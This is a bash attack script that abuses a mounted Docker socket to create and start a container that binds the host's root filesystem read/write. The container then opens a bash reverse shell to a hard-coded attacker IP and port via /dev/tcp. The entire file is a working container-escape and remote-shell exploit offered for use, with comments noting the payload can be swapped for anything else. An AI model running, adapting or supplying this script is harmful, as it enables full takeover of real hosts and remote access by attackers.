#!/bin/bash

ATTACKER_IP=5.53.16.66         # IP of attacker host running nc listener
ATTACKER_PORT=1236              # Port on the nc listener on the attacker host
DOCKER_IMAGE=confluence             # Name of the docker image to use as the base
CONTAINER_NAME=adm2    # Name of the new container

# Define the command to execute when the new container starts up
# This version executes a simple bash reverse shell from the rootfs mount /tmp, but it could be swapped out for anything else
cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'\\\"\"]"

# Create the new container:
#  - use the provided image
#  - mount the host's root file system to /tmp as read/write
#  - execute the command on container start-up
curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image\": \"$DOCKER_IMAGE\", \"Binds\": [\"/:/tmp:rw\"], \"cmd\": $cmd}" -H 'Content-Type: application/json' http://localhost/containers/create?name=$CONTAINER_NAME

# Fire up the container!
curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/$CONTAINER_NAME/start
